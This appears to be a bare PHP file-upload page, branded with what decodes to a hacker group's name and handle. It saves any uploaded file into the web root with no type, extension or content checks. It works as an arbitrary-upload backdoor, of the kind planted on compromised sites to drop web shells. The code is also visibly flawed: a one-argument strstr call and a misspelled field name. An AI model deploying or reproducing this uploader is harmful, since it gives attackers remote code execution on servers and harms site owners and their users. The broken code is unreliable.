<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body style="text-align:center">
<form action="" method="post" enctype="multipart/form-data">
Choose:
<input type="file" name="up_picture"/><br>
<input type="submit" name="file1" value="UPlOAD"> </input>
</form>
    <?php
    if(!empty($_FILES["up_picture"]["name"])){
		if($_FILES['up_picture']['error']>0){
			echo 'cuowu';}
			else{
				$path='./'.$_FILES['up_picture']['name'].strstr($_FILES['up_picture']['name']);
				if(is_uploaded_file($_FILES['up_picture']['tmp_name'])){	//ss
			if(!move_uploaded_file($_FILES['up_picture']['tmp_name'],$path)){	//ss
				echo "shibai";
			}else{
				echo "File---".$_FILES['up_picture']['name']."--Successful--".$_FILES['up_picture']['size'];	
			}
		}else{
			echo "upload File".$_FILES['up_pictute']['name']."bnwk";
		}
				}
		}
	?>
<br>
DQML
<br>
<br>
<span style="color:#F00; font-weight:bold;">%E8%AF%9A%E6%AE%B7%E7%BD%91%E7%BB%9C-%E9%BB%91%E6%97%A0%E5%B8%B8-%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9</span><br><br>
<body>
</html>